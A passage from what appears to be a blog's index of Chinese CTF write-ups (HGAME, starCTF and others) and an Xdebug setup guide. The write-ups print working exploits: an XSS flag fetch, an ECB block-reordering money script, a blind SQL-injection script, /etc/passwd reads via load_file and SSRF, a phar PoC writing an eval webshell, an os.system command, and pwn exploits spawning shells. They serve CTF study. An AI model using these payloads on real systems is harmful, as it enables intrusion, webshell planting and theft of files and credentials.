 } }; //设置连接信息 //第一个参数表示http的请求方式，支持所有http的请求方式，主要使用get和post //第二个参数表示请求的url地址，get方式请求的参数也在url中 //第三个参数表示采用异步还是同步方式交互，true表示异步 xmlhttp.open('GET', '/flag', true); //4.发送数据，开始和服务器端进行交互 //同步方式下，send这句话会在服务器段数据回来后才执行完 //异步方式下，send这句话会立即完成执行 xmlhttp.send('');   不能绕HttpOnly来获取cookie，但是我们可以直接让admin请求/flag，把responseText发给我们就行了；\n这个是本地打的结果：\n大手一抖，flag到手：\n因为flag里面出题人故意放了\u0026字符让我们踩坑，打出来的responseText需要base64编码。\n下面这个才对。\n","description":"Vidar team主办的比赛","tags":["XSS","SQLi"],"title":"HGAME 2021 Writeup","uri":"/posts/hgame-2021-writeup/"},{"categories":["note"],"content":"Debian下PHP Xdebug调试环境搭建  本文永久链接：http://wh1sper.com/debian%e4%b8%8bphp-xdebug%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/\n 前言 Xdebug是PHP的扩展，用于协助调试和开发。\n 它包含一个用于IDE的调试器 它升级了PHP的var_dump()函数 它为通知，警告，错误和异常添加了堆栈跟踪 它具有记录每个函数调用和磁盘变量赋值的功能 它包含一个分析器 它提供了与PHPUnit一起使用的代码覆盖功能。  本地跟代码必备的工具。 但不推荐在生产环境中使用xdebug，因为他太重了。\n预置环境   OS: Kali GNU/Linux Rolling x86_64\n  Kernel: 5.7.0-kali1-amd64\n  PHP version: 7.4.14\n  Server API: FPM/FastCGI\n  nginx version: nginx/1.18.0\n  PhpStorm version: 2020.3\n  下载安装Xdebug 访问https://xdebug.org/wizard\n在web服务器中放入phpinfo，（注意最好是使用web服务，如果是本地php脚本的话php.ini可能会不一样）\n访问之后将整个页面源码Ctrl+A Ctrl+C复制到框里面： 分析之后会自动给你最合适的版本，并且告诉你后续安装步骤。\n下载给出的.tar.tgz文件\n1.安装PHP拓展\napt-get install php-dev autoconf automake\r2.解压\ntar -xvzf xdebug-3.0.2.tgz\rcd xdebug-3.0.2\r3.执行以下命令，如果报错Command not found，那就先执行1.\nphpize\r完成之后会输出类似于以下内容，因环境而异，具体还请参考https://xdebug.org/wizard\nConfiguring for:\r...\rZend Module Api No: 20190902\rZend Extension Api No: 320190902\r随后分别需要执行./configure和make以及cp等命令，因环境而异，具体参考https://xdebug.org/wizard，这里不再累述。\n配置Xdebug 打开php.ini\n在末尾写入（最好去掉注释）：\n[xdebug]\r#pay attention,xdebug3 is different from 2\rzend_extension = /usr/lib/php/20190902/xdebug.so#这里位置因环境而异\rxdebug.mode=debug\rxdebug.remote_handler = dbgp\rxdebug.client_host = 127.0.0.1 #安装有PhpStorm的机器\rxdebug.client_port = 9001 #端口可修改，防止冲突\rxdebug.remote_mode=req #可以设为req或jit，req表示脚本一开始运行就连接远程客户端，jit表示脚本出错时才连接远程客户端。\rxdebug.idekey = PHPSTROM\r**注意：**如果你想 Xdebug 和 OPCache 一起使用，必须在 OPCache 之后加载 Xdebug zend_extension 代码行。\n因为我下载的版本是Xdebug3，相对于Xdebug2，remote_enable被mode取代，remote_host被client_host取代，remote_port改为client_port，默认为9003端口，client_host默认为localhost。\n如果你下载的是Xdebug2：\n[xdebug]\rzend_extension= /usr/lib/php/20190902/xdebug.so\rxdebug.remote_enable = on\rxdebug.remote_port = 9001\rxdebug.remote_host = 127.0.0.1\r写入完毕后，重启php-fpm或者重启apache。\n之后再次访问phpinfo，按Ctrl+F搜索Xdebug，成功的话你会看到和下面差不多的情况\n配置PhpStorm 打开PhpStorm；\n在File-\u003eLanguages \u0026 Frameworks-\u003ePHP下，选择CLI interpreter为你刚才配置的PHP版本\n成功的话会出现Xdebug的字样\n没有的话重新打开php.ini配置\n选择Debug分支，保证port和php.ini中的一致\n配置DBGp Proxy，一样。\n配置Server\n点击右上角，编辑配置\n在Server下拉框中，选择我们在第4步设置的Server服务名称（之前配置的Server），Browser选择你要使用的浏览器\nALL Right;\n配置FireFox 这一步可以不需要，不过配置之后方便一点；\nFireFox访问https://addons.mozilla.org/en-US/firefox/addon/xdebug-helper-for-firefox/，安装插件。\n安装完成之后，开启插件，给程序下个断点，访问，如果成功PhpStorm会自动跳出来：\n好了，到这里我们就配置完成了。\n随后携带Cookie: XDEBUG_SESSION=\"ECLIPSE\"头访问（或者开FireFox插件，一个道理）就可以进入debug了\n另外在nginx.conf里面设置fastcgi_read_timeout 600可以调整fastcgi进程向 nginx 进程发送输出过程的超时时间，默认值60秒，让调试得到时间\n","description":"PhpStorm配合Xdebug的调试环境搭建","tags":["代码审计"],"title":"Debian下PHP Xdebug调试环境搭建","uri":"/posts/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["ctf_writeup"],"content":"oh-my-note 考点：时间戳爆破\n题目分析 先给了源码：source.zip\n题目是一个留言板，发布留言的时候输入用户名可以选择为公开或者私有\n代码审计 打开源码，审计；\n在create_note()函数中，如果用户不存在，就会自动创建\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  @app.route('/create_note', methods=['GET', 'POST']) def create_note(): try: form = CreateNoteForm() if request.method == \"POST\": username = form.username.data title = form.title.data text = form.body.data prv = str(form.private.data) user = User.query.filter_by(username=username).first() if user: user_id = user.user_id else: timestamp = round(time.time(), 4) random.seed(timestamp) user_id = get_random_id() user = User(username=username, user_id=user_id) db.session.add(user) db.session.commit() session['username'] = username timestamp = round(time.time(), 4) post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime('%Y-%m-%d%H:%M UTC') #获取小数点后四位UNIX时间戳对应的Y-M-d H-M时间 random.seed(user_id + post_at) note_id = get_random_id() note = Note(user_id=user_id, note_id=note_id, title=title, text=text, prv=prv, post_at=post_at) db.session.add(note) db.session.commit() return redirect(url_for('index')) else: return render_template(\"create.html\", form=form) except Exception as e: pass   其中，我们post_at已经知道\n那么在下面这张图里，我们只有user_id不知道\n而my_note()的else里面只需要user_id就可以列出所有私有note\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  @app.route('/my_notes') def my_notes(): if session.get('username'): username = session['username'] user_id = User.query.filter_by(username=username).first().user_id else: user_id = request.args.get('user_id') if not user_id: return redirect(url_for('index')) results = Note.query.filter_by(user_id=user_id).limit(100).all() notes = [] for x in results: note = {} note['title'] = x.title note['note_id'] = x.note_id notes.append(note) return render_template(\"my_notes.html\", notes=notes)   于是我们可以根据已知的note_id和post_at来反推爆破user_id，只要算出admin的id即可看到发布的私有flag。\n因为时间戳精确到了小数点后四位，我们知道的post_at是分钟级别的，所以这里需要爆破最多10000*60次\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  import random import datetime import time import string def get_random_id(): alphabet = list(string.ascii_lowercase + string.digits) return ''.join([random.choice(alphabet) for _ in range(32)]) post_at = '2021-01-15 02:29 UTC'#admin发布的第一个Pubic note时间 l = [i/10000 for i in range(0, 10000)]#小数部分，l是一个列表 for j in range(0,60): ta1 = time.strptime('2021-01-15 10:29:{}UTC'.format(j), '%Y-%m-%d%H:%M:%S UTC')#格式化时间，因为时区不同需要加8小时  ta = int(time.mktime(ta1))#转换为时间戳 for i in l: t = ta + i#整数部分与小数部分拼接 random.seed(t) u_id = get_random_id() random.seed(u_id + post_at) p_id = get_random_id() if p_id == 'lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u':#admin发布的第一个Pubic note print(u_id) #算出来admind的userid是7bdeij4oiafjdypqyrl2znwk7w9lulgn if(i*10000 % 8999 == 0): print(i, t)   有一个坑，因为时区原因，从获得的时间反推时间戳的时候需要加8个小时\n*ctf{Y0u_Are_t3e_Master_of_3he_Time!}\nlottery again 考点：EBC重排攻击，json_decode\n题目分析 题目首先给了源码：source.zip\n网站的功能是注册，登陆，buy lottery，每一个用户初始只有300，买一次彩票花100，获得金额是1~100，然而flag需要9999。\n打开源码，审计，主要功能在Http/Controller/LotteryController.php\n同时结合抓到的数据包，我们得知运作方式是：\nfunction buy()(生成一单lottery，返回对称加密后的enc)-\u003e\rfunction info()(客户端发送enc，服务端对称解密并且jsondecode，返回这单lottery的信息)-\u003e\rfunction charge()(接收客户端的enc，对称解密并且jsondecode，根据解密得到的user uuid找到用户信息，根据lottery uuid找到lottery信息，把lottery的钱加到user账户)\r在function buy()里面有这么几行代码：\n1 2 3 4 5 6 7  $lottery = Lottery::create(['coin' =\u003e 100 - floor(sqrt(random_int(1, 10000)))]); $serilized = json_encode([ 'lottery' =\u003e $lottery-\u003euuid, 'user' =\u003e $user-\u003euuid, 'coin' =\u003e $lottery-\u003ecoin, ]); $enc = base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, env('LOTTERY_KEY'), $serilized, MCRYPT_MODE_ECB));   我们可以看到他使用了EBC模式和rijndael256来对enc进行加密；\nEBC加密模式  ECB模式是所有模式中最简单的一种。明文分组和密文分组是一一对应的，如果明文分组有相同的那么最后的密文中也会有相同的密文分组。\n因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果，如图所示（翻转密文分组，那么明文分组也会被翻转）\n ECB块重排攻击 前文说过，在块加密中ECB模式中每个块都是独立加密的。因此攻击者可以在未知密钥的情况下，对密文中的块进行重新排列，组合成合法的可解密的新密文。\n举一个例子，某CMS的cookie格式为DES-ECB加密后的数据，而明文格式如下：\nadmin=0;username=pan\r由于DES使用的块大小是8字节，因此上述明文可以切分成三个块，其中@为填充符号：\nadmin=0;\rusername\r=pan@@@@\r假设我们可以控制自己的用户名（在注册时），那么有什么办法可以在不知道密钥的情况下将自己提取为管理员呢（即admin=1）？首先将用户名设置为pan@@@@admin=1;，此时明文块的内容如下：\nadmin=0;username=pan@@@@admin=1;\r我们所需要做的，就是在加密完成后，将服务器返回的cookie使用最后一个块替换第一个块，这样一来就获得了一个具有管理员权限的合法cookie了。\n回到题目 请求/lottery/buy路由的时候，由于使用的是EBC模式的加密，每一块密文直接与明文对应\n而请求/lottery/charge的时候服务端直接解密我们传过去的enc，根据lottery的uuid和user的uuid来把lottery的金额加入账户余额。\n利用这一点我们便可以注册多个账户，生成多个lottery的uuid并且通过把lottery的uuid拼接到请求/lottery/charge时的enc，来让多个lottery的金额存到同一个user，刷钱。\n本题使用的是MCRYPT_RIJNDAEL_256加密，rijndael128与aes相同，都是以128位为一个块加密，rijndael256则是以256位为一个块，即32字节。\n对于一个enc而言：\n1 2  {\"lottery\":\"bb9c4db6-d339-4a26-9|397-caeb4bfe043e\",\"user\":\"157b58|a1-108b-47cc-abf4-fff1f903b05d\",|\"coin\":6}@@@@@@@@@@@@@@@@@@@@@@@ //@是填充   可以看到无论我们替换哪一块，都没有办法完全控制user或者lottery，但是我们可以把第一单lottery的1，2块加上第二单lottery的2，3，4块，构成类似于下面的payload：\n1  {\"lottery\":\"1287901b-89d7-4b94-a|0d7-a7655d85800d\",\"user\":\"157b58|397-caeb4bfe043e\",\"user\":\"157b58|a1-108b-47cc-abf4-fff1f903b05d\",|\"coin\":6}@@@@@@@@@@@@@@@@@@@@@@@   前面的user在json_decode之后会被后面的user所覆盖，形成了user不变而lottery任意控制的局面\n贴一个JrXnm师傅的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84  import requests import random import string import json import base64 from urllib.parse import quote user_token = \"Yu5PGq2I0jhZssXttlEaiBkNQXRrxzbD\" user_uuid = \"ae4774be-2e44-49d2-82dc-6c69c57c4378\" user_enc = b\"+Zza7U18mMFaHhYyrTaOr\\/IubODmR8QF1yC01+0XIg3Ea0s5evdcMwcHHNovcM3pytuj4wsD2NFsMv1g+yjXfyEFlnH5hTkHnLKzkFc0dmHqydlPZNnijH8cHjiFVPKU4tKa3tbXh1v0ZTejYwnrwjeWiY89xrpsXSMn2CEt8bM=\" cookie = { \"api_token\": user_token } url = \"http://52.149.144.45:8080\" def get_random(): return ''.join(random.sample(string.ascii_letters + string.digits, 10)) def register(): username=get_random() data= { \"username\": username, \"password\": \"asdasd\" } res = requests.post(url + \"/user/register\",data=data) d = json.loads(res.text) return username def login(username, password=\"asdasd\"): data = { \"username\": username, \"password\": password } res = requests.post(url + \"/user/login\",data=data) d = json.loads(res.text) return d['user']['api_token'] def info(api_token): res = requests.get(url + \"/user/info?api_token=\" + api_token) d = json.loads(res.text) print('uuid: '+d['user']['uuid']) def buy(api_key): data = { \"api_token\": api_key } res = requests.post(url + \"/lottery/buy\",data=data) #print(res.text) d = json.loads(res.text) return d['enc'] def get_enc(enc): o = base64.b64decode(enc) u = base64.b64decode(user_enc) m = base64.b64encode(o[:64] + u[32:]) print('enc: ', end='') print(quote(m)) return m def charge(enc): data = { \"user\": user_uuid, \"enc\": enc, \"coin\": \"7\" } res = requests.post(url + \"/lottery/charge\", data=data, cookies=cookie) print(\"charge: \", end='') print(res.content) if __name__ == \"__main__\": while True: try: username = register() api_token = login(username) enc = buy(api_token) info(api_token) mo_enc = get_enc(enc) charge(mo_enc) except: pass   JrXnm师傅tql，膜\noh-my-bet 考点：\n参考：\n *CTF Writeup by 星盟\n对称加密与攻击案例分析\n ","description":"复旦大学******战队举办的比赛","tags":["时间戳爆破","WebCrypto"],"title":"starCTF 2021 复现","uri":"/posts/starctf2021%E5%A4%8D%E7%8E%B0/"},{"categories":["ctf_writeup"],"content":"web easyci 考点：MySQL读写文件\n和巅峰极客的前端一样，而且发现也是布尔盲注，一阵狂喜；\nfuzz一番竟然没有任何过滤\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  #python3 import requests import time host = 'http://eci-2zegnayqf8pwz72ze2yw.cloudeci1.ichunqiu.com/public/index.php/home/login' def mid(bot, top): return (int)(0.5*(top+bot)) def transToHex(flag): res = '' for i in flag: res += hex(ord(i)) res = '0x' + res.replace('0x', '') return res def sqli(): name = '' for j in range(1, 2000): top = 126 bot = 32 while top \u003e bot: #babyselect = '(database())'#p3rh4ps babyselect = 'password'#c3762483bc73d0b7943156d43911ce38-\u003eHEIHEIHEIHEI #babyselect = \"\" payload = \"0'||ascii(substr({},{},1))\u003e{}#\".format(babyselect, j, mid(bot, top)) data = { \"username\": payload, \"password\": \"1\" } proxy = {\"http\": \"http://127.0.0.1:8080\"} try: r = requests.post(url=host, data=data, timeout=3, proxies=proxy) #print(payload) #print(r.text) if r.text.count('\u003e密码错误\u003c') == 1: bot = mid(bot, top) + 1 else: top = mid(bot, top) except: continue name += chr(top) print(name) if __name__ == '__main__': sqli()   注出密码，登陆之后，你就中计了；\n扫目录可以扫到很多json，里面含有一些组件信息\n不过查看了一下，这个框架这个版本目前是没有符合情景的漏洞的；\n真正的利用点其实就在一开始的登陆界面，没有任何waf其实也挺奇怪，说明这道题可能不是常规考点\n读取/etc/passwd：\n0'||ascii(substr((select load_file('/etc/passwd')),1,1))\u003e79#\r发现能读，但是/var/www/html路径却读不到东西；\n那么猜测web路径可能被改了，改了就可以猜，猜不到就只能读；\nmd，确实猜不到。\n读取/etc/apache2/apache2.conf(太长了我就不贴代码了)，其中有一个路径值得关注：\n没错，web路径就是/var/sercet/html/，用0'||ascii(substr((select load_file('/var/sercet/html/index.php')),1,1))\u003e79#可以读取index.php的源码：\nSQLmap一梭子Getshell\n使用--file-dest和--file-write参数的话，只能创建那个文件但是不能写入内容。这里只能用--os-shel来进行写入；\n遇到玄学，没梭进去。。。。按理说是没问题的，sqlmap写的时候会神必在后面拼接路径，然后好像只有web根目录可以写\nezcms 扫目录www.zip下载源码\n发现是yzmcms\ncommon\\config\\config.php看到数据库配置\n/admin/index/login.html为管理员后台，尝试默认口令yzmcms/yzmcms登录失败，尝试是否密码为admin/admin868，成功登陆\n然后找各种编辑器上传、模板修改，但都进行了严格限制\n谷歌百度没找到啥可用的洞\n找到github源码，看看最近的issue，找到个后台SSRF：https://github.com/yzmcms/yzmcms/issues/53\n本地跟了一下代码，在application\\collection\\controller\\collection_content.class.php的183~224行的public function collection_article_content()\n在后台的模块管理-\u003e采集管理模块处添加节点，然后网址处填写构造的恶意页面\n跟进collection类，转到yzmphp\\core\\class\\collection.class.php：\n很明显无任何过滤的file_get_content()，利用此进行一个SSRF可以任意文件读取\n尝试读/etc/passwd ssrf.html：\n1  \u003cleon\u003e\u003ca href=\"httpxxx://../../../../../../etc/passwd\"\u003e123\u003c/a\u003e\u003c/leon\u003e   这里用httpxxx是因为yzmphp\\core\\class\\collection.class.php的189行对url协议前四位限制了http\n配置如下：\n成功读取： 尝试读flag:\n1  \u003cleon\u003e\u003ca href=\"httpxxx://../../../../../../flag\"\u003e123\u003c/a\u003e\u003c/leon\u003e   flag{46a41939-3d92-411f-8ba2-3dbefa6fdff0}\rhello_php 扫目录www.zip拿源码\n简单审计一下，文件上传、文件后缀拼接.jpg、index.php很明显有个文件操作函数\n明显的phar反序列化，看class.php找析构函数，发现对config.php进行写入，于是只需要反序列化控制$this-\u003etitle为恶意代码即可，简单写个一句话shell，绕一下正则替换：\npoc：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  \u003c?php class Config{ public $title; public $comment; public $logo_url; } $o = new Config(); $o-\u003etitle=\"';eval(\\$_GET[a]);#\"; @unlink(\"test.phar\"); $phar = new Phar(\"test.phar\"); $phar-\u003estartBuffering(); $phar-\u003esetStub(\"\u003c?php __HALT_COMPILER(); ?\u003e\"); $phar-\u003esetMetadata($o); $phar-\u003eaddFromString(\"test.txt\", \"test\"); $phar-\u003estopBuffering(); ?\u003e  生成phar文件上传，由于文件名是md5(time())，所以爆破上传一下就行\nexp:\nindex.php?img=phar://./static/02b969e2b0f2619f59521f67aa8c035d.jpg\r触发phar反序列化后,config.php就写入了恶意代码，index.phpinclude了config.php，所以直接:\nflag{0f131b09-a441-4723-bc02-bf4516863884}\r大家一起来审CMS www.zip 源码\n是海洋cms\n在 adm1n/admin_smtp.php 发现了 直接没有waf的写入，并且是往一个php文件里面写，由于一些变量可控让我们可以代码注入 admin\\admin登陆后台； 之后访问admin_smtp.php，在点击“确认”的时候抓取数据包，改包：\n直接来一发： Misc 签到 八进制\n问卷 填写问卷\nbabymaze1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149  #coding=utf-8 from pwn import* import numpy as np #context.log_level = 'DEBUG' def Get_T(s): line = [] tmp = [] j = 0 k = 0 start = [] end = [] data = '' for i in range(s): data += p.recvline() data = data.replace('\\x23','\\x00') # black  data = data.replace('\\x20','\\x01') # white data = data.replace('\\x24','\\x03') # flag data = data.replace('\\x2A','\\x02') for i in data: if(i == '\\n'): line.append(tmp) tmp = [] j += 1 k = 0 elif(i == '\\x02'): start.append(j) start.append(k) k += 1 tmp.append(ord(i)) elif(i == '\\x03'): end.append(j) end.append(k) k += 1 tmp.append(ord(i)) else: k += 1 tmp.append(ord(i)) return line,start,end ############################### def up(location): # 到达了数组顶端 if location[0] == 0: return False else: new_location = [location[0] - 1, location[1]] # 走过的路不再走 if new_location in history_path: return False # 遇到墙不走 elif maze[new_location[0]][new_location[1]] == 0: return False else: lookup_path.append(new_location) history_path.append(new_location) return True def down(location): # 遇到迷宫最下方的时候，不能继续往下走 if location[0] == len(maze) - 1: return False else: new_location = [location[0] + 1, location[1]] # 走过的路不再走 if new_location in history_path: return False # 遇到墙不走 elif maze[new_location[0]][new_location[1]] == 0: return False else: history_path.append(new_location) lookup_path.append(new_location) return True def left(location): # 遇到迷宫最左边，不能继续往左走 if location[1] == 0: return False else: new_location = [location[0], location[1] - 1] # 走过的路不再走 if new_location in history_path: return False # 遇到墙不走 elif maze[new_location[0]][new_location[1]] == 0: return False else: history_path.append(new_location) lookup_path.append(new_location) return True def right(location): # 遇到迷宫最右边，不能继续向右移动 if location[1] == len(maze[0]) - 1: return False else: new_location = [location[0], location[1] + 1] # 走过的路不再走 if new_location in history_path: return False # 遇到墙不走 elif maze[new_location[0]][new_location[1]] == 0: return False else: history_path.append(new_location) lookup_path.append(new_location) return True def get_line(path): p = '' for i in range(len(path)-1): tmp1 = path[i] tmp2 = path[i + 1] if tmp1[0] \u003e tmp2[0]: p += 'w' elif tmp1[0] \u003c tmp2[0]: p += 's' if tmp1[1] \u003e tmp2[1]: p += 'a' elif tmp1[1] \u003c tmp2[1]: p += 'd' return p p = remote('182.92.203.154',11001) p.sendlineafter('Please press any key to start.','FMYY') for i in range(5): log.info('LEVEL' + str(i+1)) maze,start,end = Get_T(11 + i*10) lookup_path = [] history_path = [] lookup_path.append(start) history_path.append(start) while lookup_path[-1] != end: now = lookup_path[-1] if up(now) or down(now) or left(now) or right(now): continue lookup_path.pop() #print(\"Final:\", lookup_path) path = get_line(lookup_path) #log.info('PATH:\\t' + path) p.sendlineafter('\u003e ',path) p.recvuntil('your win\\n') p.interactive()   babymaze2 input漏洞函数的非预期RCE\n1  __import__('os').system('cat flag')   马赛克 Depix直接看\nPwn wind_farm_panel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  from pwn import* def menu(ch): p.sendlineafter('\u003e\u003e ',str(ch)) def new(index,size,content): menu(1) p.sendlineafter(': ',str(index)) p.sendlineafter('turbine: ',str(size)) p.sendafter('name: ',content) def show(index): menu(2) p.sendlineafter('viewed: ',str(index)) def edit(index,content): menu(3) p.sendlineafter('turbine: ',str(index)) p.sendafter('input: ',content) p = process('./main') p = remote('182.92.203.154',28452) libc =ELF('./libc-2.23.so') new(0,0x200,'\\x00'*0x208 + p32(0xDF1)) new(1,0x1000,'FMYY') new(2,0x100,'\\xA0') show(2) libc_base = u64(p.recvuntil('\\x7F')[-6:].ljust(8,'\\x00')) - libc.sym['__malloc_hook'] - 0x70 - 0x620 log.info('LIBC:\\t' + hex(libc_base)) IO_list_all = libc_base + libc.sym['_IO_list_all'] IO_str_jumps = libc_base + 0x3C37A0 fake_IO_FILE = p64(0) + p64(0x61) fake_IO_FILE += p64(0) + p64(IO_list_all - 0x10) fake_IO_FILE += p64(0) + p64(1) fake_IO_FILE += p64(0) + p64(libc_base + libc.search('/bin/sh').next()) fake_IO_FILE = fake_IO_FILE.ljust(0xD8,'\\x00') fake_IO_FILE += p64(IO_str_jumps - 8) fake_IO_FILE += p64(0) + p64(libc_base + libc.sym['system']) new(3,0x200,'\\x00'*0x200 + fake_IO_FILE) menu(1) p.sendline('4') p.sendline(str(0x200)) p.interactive()   shell 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  from pwn import* context.log_level = 'DEBUG' p = process('./main') p = remote('182.92.203.154',35264) libc =ELF('./libc-2.23.so') p.sendline('fg %12$p') p.recvuntil('0x') proc_base = int(p.recv(12),16) - 0x203169 log.info('Proc:\\t' + hex(proc_base)) payload = 'fg %174$s' payload = payload.ljust(0x10,'U') payload += p64(proc_base + 0x2030B8) p.sendline(payload) libc_base = u64(p.recvuntil('\\x7F')[-6:].ljust(8,'\\x00')) - libc.sym['getopt'] log.info('LIBC:\\t' + hex(libc_base)) payload = 'fg %' + str((libc_base + 0x45226)\u00260xFF) + 'c%174$hhn' payload = payload.ljust(0x10,'U') payload += p64(proc_base + 0x2030C8) p.sendline(payload ) sleep(0.2) payload = 'fg %' + str(((libc_base + 0x45226)\u003e\u003e8)\u00260xFF) + 'c%174$hhn' payload = payload.ljust(0x10,'U') payload += p64(proc_base + 0x2030C8 + 1) p.sendline(payload ) sleep(0.2) payload = 'fg %' + str(((libc_base + 0x45226)\u003e\u003e16)\u00260xFF) + 'c%174$hhn' payload = payload.ljust(0x10,'U') payload += p64(proc_base + 0x2030C8 + 2) p.sendline(payload) sleep(0.2) payload = 'fg %' + str(((libc_base + 0x45226)\u003e\u003e24)\u00260xFF) + 'c%174$hhn' payload = payload.ljust(0x10,'U') payload += p64(proc_base + 0x2030C8 + 3) p.sendline(payload) sleep(0.2) payload = 'fg %' + str(((libc_base + 0x45226)\u003e\u003e32)\u00260xFF) + 'c%174$hhn' payload = payload.ljust(0x10,'U') payload += p64(proc_base + 0x2030C8 + 4) p.sendline(payload) sleep(0.2) payload = 'fg %' + str(((libc_base + 0x45226)\u003e\u003e40)\u00260xFF) + 'c%174$hhn' payload = payload.ljust(0x10,'U') payload += p64(proc_base + 0x2030C8 + 5) p.sendline(payload) p.sendline('quit') p.interactive()   Crypto common $$ W_i : e_i d_i g − k_i N = g − k_i s \\ G_{i,j} : k_i d_j e_j − k_j d_i e_i = k_i − k_j $$\n则 $k_1 k_2 = k_1 k_2, k_2 W_1, g G_{1,2}, W_1 W_2$ 转化成矩阵形式, 有 $x B = v$, 其中\n$$ x = (k_1 k_2, k_2 d_1 g, k_1 d_2 g, d_1 d_2 g^2 )\\ $$\n$$ B = \\begin{bmatrix} 1 \u0026 −N \u0026 0 \u0026 N^2 \\ \u0026 e_1 \u0026 −e_1 \u0026 −e_1 N \\ \u0026 \u0026 e_2 \u0026 −e_2 N \\ \u0026 \u0026 \u0026 e_1 e_2 \\end{bmatrix} \\ $$\n$$ v = ( k_1 k_2, k_2 (g − k_1 s), g(k_1 − k_2 ), (g − k_1 s)(g − k_2 s) ) $$\n令 $D = diag(N, N^{1/2}, N^{1+δ}, 1)$, 使其满足 Minkowski’s bound, 有 $||vD|| \u003c vol(L) = |det(B) det(D)|$​ 即 $N^{2(1/2+δ)} \u003c 2N^{(13/2+δ)/4}$, $\\delta \u003c 5/14 - \\epsilon$.\n利用 LLL 求出最短向量 $vD$, 进而求出 $x$, 根据 Wiener’s attack,\n$\\phi(N) = g(ed-1)/k = floor(edg/k)$\n有了 $\\phi(N)$ 即可构造一元二次方程分解 $N$.\n由于不知道 d 的 bit_length，所以在 d 的范围数量级内进行枚举.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  from Crypto.Util.number import * e1 = 28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581 e2 = 131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563 n = 159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253 c1 = 146909924775777545824125517620214432622747621336824079421034301103629039466278879970055167808022739191107404040533998083148999374814673815811700861183666902780211467579162513402284885468509497173923312288517762537710685279334418218434239027287721913878857488858370213558290629714369437407772388155553108200163 c2 = 115438050647632891775942222426836609647233560975189459023903698975771968885651962350811446729447308791250106017608721971839646737217571069312136094548245526295433224742092456687558361490026944153234227613733080447542300903055383052411559869065719789087584331775863089548946206039897996352433427474819495059230 m1 = int(n^(1/2)) def autoflag(t): m2 = int(n^(1+t)) B2 = matrix([[1,-n, 0, n**2], [0,e1,-e1,-e1*n], [0, 0, e2,-e2*n], [0, 0, 0,e1*e2]]) D2 = matrix([[n, 0, 0,0], [0,m1, 0,0], [0, 0,m2,0], [0, 0, 0,1]]) M = B2*D2 # k1k2, k2d1, k1d2, d1d2 for vec in M.LLL()[:1]: b1,b2,b3,b4 = vec x2 = Matrix([[b1,b2,b3,b4]])*M.inverse() a,b,c,d = x2[0] d1 = GCD(b,d) d2 = GCD(c,d) if d1 and d2: print(long_to_bytes(pow(c1,d1,n))+long_to_bytes(pow(c2,d2,n))) exit(0) t=0.3334 while t\u003c0.3570: t+=0.0001 autoflag(t)   digits_missing 分段解flag，最开始可以直接解传到leak函数里的c，通过已知的p,q，直接解c4，得到flag[1] + flag[2].\n1 2 3 4 5 6  from Crypto.Util.number import * c4 = 91995782648980010847427739993217486026162499349605746023085733950130331287970901582164575965127425637201059093005775243323253033284087100922267082650658959030428900175654644688492357085409246823740850913373272701143044152106592667697815257823931523933665000651956390275184280406451020398039989430172569966888 p = 8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093 q = 11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623 flag12 = long_to_bytes(pow(c4, inverse(0x10001, (p-1)*(q-1)), p*q)) print(flag12) # 1b1e4c40   然后可以利用CRT求出d，得到padding，由于不知道e，所以需要枚举一下。\n1 2 3 